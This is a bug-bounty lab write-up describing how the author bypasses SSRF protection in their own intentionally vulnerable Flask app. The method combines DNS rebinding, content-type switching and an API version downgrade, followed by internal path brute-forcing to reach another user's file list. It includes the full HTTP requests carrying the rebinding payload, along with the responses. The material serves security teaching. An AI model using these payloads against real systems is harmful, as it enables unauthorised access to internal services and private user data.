# Bypassing SSRF Protection with DNS Rebinding Attack

Lab-URL: [https://github.com/h0tak88r/bug-bounty-labs/tree/main/ssrf-with-dns-rebinding-lab/lab](https://github.com/h0tak88r/bug-bounty-labs/tree/main/ssrf-with-dns-rebinding-lab/lab)

### Setting Up the lab&#x20;

```bash
➜  lab git:(main) sudo docker build -t ssrf-bug .
[+] Building 130.9s (11/11) FINISHED                             docker:default
 => [internal] load build definition from Dockerfile                       0.0s
 => => transferring dockerfile: 554B                                       0.0s
 => [internal] load metadata for docker.io/library/ubuntu:latest           1.4s
 => [internal] load .dockerignore                                          0.0s
 => => transferring context: 45B                                           0.0s
 => CACHED [1/6] FROM docker.io/library/ubuntu:latest@sha256:2e863c44b718  0.0s
 => [internal] load build context                                          0.0s
 => => transferring context: 2.19kB                                        0.0s
 => [2/6] RUN apt-get update -y && apt-get install -y python3 python3-p  116.2s
 => [3/6] COPY . /ssrf-bug                                                 0.0s 
 => [4/6] WORKDIR /ssrf-bug                                                0.0s 
 => [5/6] RUN python3 -m venv venv                                         3.3s 
 => [6/6] RUN /bin/bash -c "source venv/bin/activate && pip install -r re  7.8s 
 => exporting to image                                                     2.1s 
 => => exporting layers                                                    2.1s 
 => => writing image                                                       0.0s 
 => => naming to docker.io/library/ssrf-bug                                0.0s 
 
➜  lab git:(main) ✗ sudo docker run -p 80:80 ssrf-bug
 * Serving Flask app 'app'
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:80
 * Running on http://172.17.0.2:80
Press CTRL+C to quit

```

### Let's start Hacking&#x20;

when i opened the lab it starts with normal login page \


<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

After Loging in I noticed that there is api request to get user's Files using user's UUID it wasn't vulnerable to idor but i noted it anyway bc i think it might helps in the future \


<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

But the user id is defecult and unbredetable and non bruteforcable&#x20;

IOn the dome of the application you can upload a file from external websites&#x20;

this is a function that trigger ssrf in my head&#x20;

so i tried to get a file from local host but i got 403 status code with invalid url message \


<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

so i have a list of payloads ssrf so i sent this request to intruder and tried to fuzz with my payloads \
[https://github.com/h0tak88r/Wordlists/blob/master/vulns/ssrf.txt](https://github.com/h0tak88r/Wordlists/blob/master/vulns/ssrf.txt)\
so i started fuzzing and this photo illustrate the results is not actually indicating any bug here \


<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

So idecided to try the DNS rebinding attack with hekp of this tool \
[https://lock.cmpxchg8b.com/rebinder.html](https://lock.cmpxchg8b.com/rebinder.html)\
\
i made it rebind between google ip address and the local host \


<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

To make sure i tried to ns lookup the domain in the terminal and i have comfirmed that it is working&#x20;

```bash
➜  lab git:(main) ✗ nslookup 7f000001.d83ad3ce.rbndr.us
Server:		127.0.0.53
Address:	127.0.0.53#53

Non-authoritative answer:
Name:	7f000001.d83ad3ce.rbndr.us
Address: 216.58.211.206

➜  lab git:(main) ✗ nslookup 7f000001.d83ad3ce.rbndr.us
Server:		127.0.0.53
Address:	127.0.0.53#53

Non-authoritative answer:
Name:	7f000001.d83ad3ce.rbndr.us
Address: 216.58.211.206

➜  lab git:(main) ✗ nslookup 7f000001.d83ad3ce.rbndr.us
Server:		127.0.0.53
Address:	127.0.0.53#53

Non-authoritative answer:
Name:	7f000001.d83ad3ce.rbndr.us
Address: 127.0.0.1

```

so here what we need is to make mujltiple triest in the request until we success

but unfortunately the  still couldn't bypass ssrf protecttion\


<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

So i was thinking what if we tried either content type like json requestsometimes this may confue the servers and trick them \
i used burp extention called content type converter \


<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

the request before changing content type&#x20;

```
POST /api/v3/upload HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Origin: http://127.0.0.1
DNT: 1
Sec-GPC: 1
Connection: close
Referer: http://127.0.0.1/
Cookie: uuid_hash=8f282a4de56b5a379083e16339d84cd9bee0f64503f9159c5ca7a89f2484a121cae32d23afed9fc673225e1b1ac4beb468964e832a8ef43a2758a475aa2703ed
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
X-PwnFox-Color: red
Priority: u=0, i

file_url=http://7f000001.d83ad3ce.rbndr.us/secret.txt
```

after changing content type&#x20;

```
POST /api/v3/upload HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Length: 59
Origin: http://127.0.0.1
DNT: 1
Sec-GPC: 1
Connection: close
Referer: http://127.0.0.1/
Cookie: uuid_hash=8f282a4de56b5a379083e16339d84cd9bee0f64503f9159c5ca7a89f2484a121cae32d23afed9fc673225e1b1ac4beb468964e832a8ef43a2758a475aa2703ed
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
X-PwnFox-Color: red
Priority: u=0, i
Content-Type: application/json;charset=UTF-8

{"file_url":"http://7f000001.d83ad3ce.rbndr.us/secret.txt"}
```

and tried the dns rebinding attack and again didn't succeeded&#x20;

so i tried the common techinique used agains apis is to get back in versions from v3 to v2

and now the server returns a message "requests to localhost not allowed"

but with trying multiple times here qe finally found an indicator of the successfull attack&#x20;

theserver returned status code 404 notfound  brecause secret.txt is not on the localhost&#x20;

<figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

so now we need to nbrute force the files/directories&#x20;

iu used this wordlist [https://github.com/v0re/dirb/blob/master/wordlists/common.txt](https://github.com/v0re/dirb/blob/master/wordlists/common.txt)

so here i found it so difficult to brute force  with intruder i need tool that keeps trying until success

so i used this python script&#x20;

{% embed url="https://github.com/h0tak88r/bug-bounty-labs/blob/main/ssrf-with-dns-rebinding-lab/poc/poc.py" %}

and the response is like that&#x20;

```bash
➜  poc git:(main) ✗ python3 poc.py                           
2024-07-27 12:09:50,638 - INFO - / -> 200
2024-07-27 12:12:07,478 - INFO - /api -> 200

```

so i requested the /api endpoint in the reqpeater&#x20;

the server returns those directories&#x20;

```http
HTTP/1.1 200 OK
Server: Werkzeug/3.0.3 Python/3.12.3
Date: Sat, 27 Jul 2024 09:15:18 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 29
Connection: close

/users
/status
/employees
```

<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

so i requested the /api/users endpointr and it returns all registered users uuids&#x20;

<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

so i triesd to send the user's uuid in  a get parameter to retreive the suser''s secret files \
i took the \[arameter fromt he previousas request that was getting suer's files using usere's uuids&#x20;

```http
POST /api/v3/users HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://127.0.0.1/
Content-Type: application/json
Content-Length: 52
Origin: http://127.0.0.1
DNT: 1
Sec-GPC: 1
Connection: close
Cookie: uuid_hash=<>
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
X-PwnFox-Color: red
Priority: u=4

{"user_uuid":"05262283-b53e-4410-8793-21c7eef6ed19"}
```

i used this parameter (user\_uuid)  in the request as a get parameter but the response not changing&#x20;

after some barameter guissing i found out it wants parameter called uuid not user\_uuid

request

```http
POST /api/v2/upload HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Length: 101
Origin: http://127.0.0.1
DNT: 1
Sec-GPC: 1
Connection: close
Referer: http://127.0.0.1/
Cookie: uuid_hash=<>
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
X-PwnFox-Color: red
Priority: u=0, i
Content-Type: application/json

{"file_url":"http://7f000001.d83ad3ce.rbndr.us//api/users?uuid=05262283-b53e-4410-8793-21c7eef6ed19"}
```

resoonse&#x20;

```http
HTTP/1.1 200 OK
Server: Werkzeug/3.0.3 Python/3.12.3
Date: Sat, 27 Jul 2024 09:32:18 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 25
Connection: close

["my-twitter-creds.txt"]
```

And here we go we did it !!
